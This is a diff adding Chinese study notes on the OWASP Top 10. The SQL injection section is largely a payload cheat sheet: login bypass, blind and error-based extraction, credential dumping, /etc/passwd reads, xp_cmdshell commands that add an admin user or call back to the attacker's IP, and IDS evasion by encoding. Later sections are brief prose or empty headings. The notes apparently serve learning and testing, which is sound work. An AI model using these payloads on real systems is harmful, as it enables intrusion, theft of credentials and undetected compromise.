@@ -1,0 +1,222 @@
+#   1*注入攻擊(Injection)
+
+1. SQL Injection 運作基本原理
+SELECT * FROM users WHERE login = ‘victor‘ AND password = ‘123‘
+
+駭客只要將使用者姓名與密碼更換，就可以巧妙的逃避帳號密碼的檢查
+
+SELECT * FROM users WHERE username = ‘ ‘ or 1=1 – – AND password = ‘anything‘
+
+防護上有個迷失就是將 ‘ 變成 ” 就可以解決這樣的問題，這是錯誤的!
+
+‘ 變成 ” 僅能解決字串，對於數字或是日期的資料還是無法避免 SQL injection。
+
+2. 數值資料的 SQL injection
+對於數值之料的運作並不會有 ‘ 或是 “的出現，因此單純的 ‘ 轉換為 “並無法有效的阻止 SQL injection
+
+SELECT * FROM clients WHERE account = 12345678 AND pin = 1111
+
+SELECT * FROM clients WHERE account = 1 or 1=1 # AND pin = 1111
+
+ 
+
+3. SQL Injection 測試字元符號
+那麼可不可以用字元符號來判斷有沒有 SQL injection呢? 也不可以!
+
+筆者這裡僅列出SQL injection 常會看到的符號。但是駭客有其他的方式可以逃避這樣的偵查。稍後說明。
+
+建議可以用下列等符號在表單與許多參數進行輸入驗證測試。
+
+‘ or “
+— or #
+/*…*/
++
+||
+%
+?var1=name&var2=password
+@variable or @@variable
+waitfor delay ‘0:0:10’
+UNION
+‘ ” ) # || + >
+%09select (tab%09, carriage return%13, linefeed%10 and space%32 with and, or, update, insert, exec, etc)
+4. 取得錯誤訊息
+接著駭客就會透過特別的錯誤訊息來得知資料庫的版本資訊。MSSQL or MySQL等。
+
+進一步，錯誤訊息可以告訴我們欄位的值。
+
+‘ group by columnnames having 1=1 – –
+‘ union select 1,1,’text’,1,1,1 – –
+‘ union select 1,1, bigint,1,1,1 – –
+‘ and 1 in (select ‘text’ ) – –
+‘ and 1 in (select x from temp) —
+‘ and 1 in (select substring (x, 256, 256) from temp) —
+‘ and 1 in (select substring (x, 512, 256) from temp) —
+‘ drop table temp —
+5. Blind Injection
+如果無法回傳錯誤訊息，駭客就必須透過 Blind Injection的方式來取得必要資訊。
+
+原理就是利用等待時間。如果條件 A為真，就等待5秒，否則不等待。透過這樣的方式獲取資料庫更進一步的訊息。
+
+‘ and condition and ‘1’=’1
+
+‘; if condition waitfor delay ‘0:0:5’ —
+
+‘; union select if( condition , benchmark (100000, sha1(‘test’)), ‘false’ ),1,1,1,1;
+
+透過 Store procedure
+,@variable
+
+?Param1=foo&Param2=bar
+
+PRINT
+
+PRINT @@variable
+
+Database 間的差異
+https://www.qa-knowhow.com/wp-content/uploads/2015/10/DB-differences.png
+
+
+6. 找出使用者權限
+可以透過下列SQL 輸入找出使用者目前權限
+
+‘ and 1 in (select user ) —
+‘; if user =’dbo’ waitfor delay ‘0:0:5 ‘–
+‘ union select if( user() like ‘root@%’, benchmark(50000,sha1(‘test’)), ‘false’ );
+7. 發覺資料庫的資料結構
+可以透過下列方式輸入得知資料庫 Table, Column等名稱。
+
+‘ group by columnnames having 1=1 —
+‘ union select sum(columnname ) from tablename —
+‘ and 1 in (select min(name) from sysobjects where xtype = ‘U’ and name > ‘.’) —
+SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘tablename ‘)
+show columns from tablename
+‘ union select 0, sysobjects.name + ‘: ‘ + syscolumns.name + ‘: ‘ + systypes.name, 1, 1, ‘1’, 1, 1, 1, 1, 1  from sysobjects, syscolumns, systypes where sysobjects.xtype = ‘U’ AND sysobjects.id = syscolumns.id AND syscolumns.xtype = systypes.xtype —
+‘ and 1 in (select min(name ) from master.dbo.sysdatabases where name >’.’ ) —
+‘ and 1 in (select min(filename ) from master.dbo.sysdatabases where filename >’.’ ) —
+資料庫通常會有系統資料表，如果這些系統資料表沒有設定適當的存取權限，也會被駭客使用。
+
+MS SQL Server: sysobjects syscolumns systypes sysdatabases
+MySQL: mysql.user mysql.host mysql.db
+8. 查詢帳號密碼
+‘; begin declare @var varchar(8000) set @var=’:’ select @var=@var+’ ‘+login+’/’+password+’  ‘  from users where login>@varselect @var as var into temp end —
+‘ and 1 in (select var from temp) —
+‘ ; drop table temp —
+‘; insert into users select 4,’Victor’,’Chapela’,’victor’,’Pass123′ —
+9. 與作業系統互動
+如果資料庫權限設定不當，這是最危險的一種攻擊。
+
+因為透過SQL可以執行許多作業系統的指令或是取得機密檔案。
+
+最常見的就是 “xp_cmdshell“的指令。這個指令可以執行作業系統任何指令。
+
+‘ union select 1,load_file(‘/etc/passwd’),1,1,1;
+create table temp( line blob );
+load data infile ‘/etc/passwd’ into table temp;
+select * from temp;
+‘; exec master..xp_cmdshell ‘ipconfig > test.txt’ —
+‘ and 1 in (select substring(x,1,256) from temp) —
+‘; declare @var sysname; set @var = ‘del test.txt’; EXEC master..xp_cmdshell @var; drop table temp; drop table tmp —
+‘ union select 1, (load_file(‘/etc/passwd’)),1,1,1;
+‘; exec xp_cmdshell ‘net user /add victor Pass123’–
+‘; exec xp_cmdshell ‘net localgroup /add administrators victor’ —
+‘; exec master..xp_servicecontrol ‘start’,’FTP Publishing’ —
+10. 取得資料庫相關資訊
+‘ and 1 in (select @@servername ) —
+‘ and 1 in (select srvname from master..sysservers ) —
+‘; exec master..xp_cmdshell ‘nslookup a.com MyIP’ —
+‘; exec master..xp_cmdshell ‘ping MyIP’ —
+透過xp_cmdshell的執行下列指令
+
+Ipconfig /all
+Tracert  myIP
+arp -a
+nbtstat -c
+netstat -ano
+route print
+11. 駭客如何躲避 IDS的偵測?
+‘ OR 1=1 是最常見的 SQL injection 輸入，因此 IDS 對於這樣的輸入會偵測到並且攔截。
+
+駭客當然不會這樣輸入，駭客會做一些變化，只要輸入 OR 後的條件永遠為True 皆可。舉例如下：
+
+‘ OR ‘unusual’ = ‘unusual’
+‘ OR ‘something’ = ‘some’+’thing’
+‘ OR ‘text’ = N’text’
+‘ OR ‘something’ like ‘some%’
+‘ OR 2 > 1
+‘ OR ‘text’ > ‘t’
+‘ OR ‘whatever’ IN (‘whatever’)
+‘ OR 2 BETWEEN 1 AND 3
+對於資安測試來說，也可以透過這些輸入驗證 IDS是否可以有效的偵測這些攻擊。
+
+12. 透過Encoding 的方式逃避IDS
+常見 encoding 的方式有
+
+URL encoding
+Unicode/UTF-8
+Hex enconding
+char() function
+駭客輸入	                                                                            實際意義
+‘ or username like char(37);	                                                       |‘ or username like %;
+‘ union select * from users where login = char(114,111,111,116);	                   |‘ union select * from users where login = root
+‘ union select 1, (load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;	 |/etc/passwd
+13. 透過程式註解逃避檢查
+駭客輸入	                         實際意義
+UNION/**/SELECT/**/             	| UNION   SELECT
+‘/**/OR/**/1/**/=/**/1	          | ‘ OR 1 = 1
+‘; EXEC (‘SEL’ + ‘ECT US’ + ‘ER’)	| ‘; EXEC (‘SELECT USER’)
+
+#   2*無效身分認證(Broken Authentication)
+
+1，定義
+身份認證：身份認證最常用於系統登錄，形式一般為用戶名和密碼登錄方式，在安全性要求較高的情況下，還有驗證碼，客戶端證書，u鍵等
+
+會話管理：HTTP利用會話機制來實現身份認證，HTTP身份認證的結果往往是獲得一個令牌並放在餅乾中，之後的身份識別只需讀授權令牌，而無需再次進行登錄認證
+
+2，原理
+開發者通常會建立自定義的認證和會話管理方案。但與身份認證和回話管理相關的應用程序功能往往得不到正確的實現，要正確實現這些方案卻很難，結果在退出，密碼管理，超時，密碼找回，帳戶更新等方面存在漏洞，這就導致了攻擊者攻擊者破壞密碼，密鑰，會話令牌或攻擊其他的漏洞去冒充其他用戶的身份（暫時或永久的）
+
+3，危害
+可能導致部分甚至全部賬戶遭受攻擊，攻擊者一旦成功，攻擊者能執行受害用戶的任何操作。因此管理員賬戶，特權賬戶是常見的攻擊目標
+
+4，檢測失效的身份認證和會話管理
+4.1，用戶身份驗證憑證沒有使用哈希或加密保護
+
+4.2，認證憑證可猜測，或者能夠通過薄弱的帳戶管理功能（例如賬戶創建，密碼修改，密碼恢復，弱會話ID）重寫
+
+4.3，會話ID暴露在URL裡（例如URL重寫）
+
+4.4，會話ID容易受到會話固定（session fixation）的攻擊
+
+4.5，會話ID沒有超時限制，或者用戶會話或身份驗證令牌特別是單點登錄令牌在用戶註銷時沒有失效
+
+4.6，成功註冊後，會話ID沒有輪轉
+
+4.7，密碼，會話ID和其他認證憑據使用未加密連接傳輸
+
+5，防範
+5.1，分區公共區域和受限區域：站點的公共區域允許任何人用戶進行匿名訪問，受限區域只能接受特定用戶的訪問
+
+5.2，對cookie的內容進行加密
+
+5.3，可以設置鎖定賬戶策略
+
+5.4，設置密碼和會話的有效期，並使用強密碼（密碼必須是數字和字母的組合）
+
+5.5，賬號密碼以密文形式傳輸
+原文：HTTPS：//blog.csdn.net/a378177461/article/details/80225385
+
+#   3*敏感資料外洩(Sensitive Data Exposure)
+
+主要是因為不少網路應用程式對於金融資訊、健康資料及個人資料的保護不足，若遭當駭客取得，就可以進行信用卡詐欺、身份竊取或是其他的犯罪行為等。
+因此，針對敏感性資料去需要做額外的保護措施，例如不使用或傳送時的資料必須加密，或者是瀏覽器瀏覽時，也必須要特別注意。
+
+#   4*XML外部處理器漏洞(XML External Entity,XXE)
+
+https://hk.saowen.com/a/ef1d25fdebeebb89111a674df969127d5b5410c4b235c2b1d4abeb7d9f48a951
+
+#   5*無效的存取控管(Broken Access Control)
+#   6*不安全的組態設定(Security Misconfiguration)
+#   7*跨站攻擊(Cross-Site Scripting,XSS)
+#   8*不安全的反序列化漏洞(Insecure Deserialization)
+#   9*使用已有漏洞的元件(Using Components with Known Vulnerabilities)
+#   10*紀錄與監控不足風險(Insufficient Logging & Monitoring)
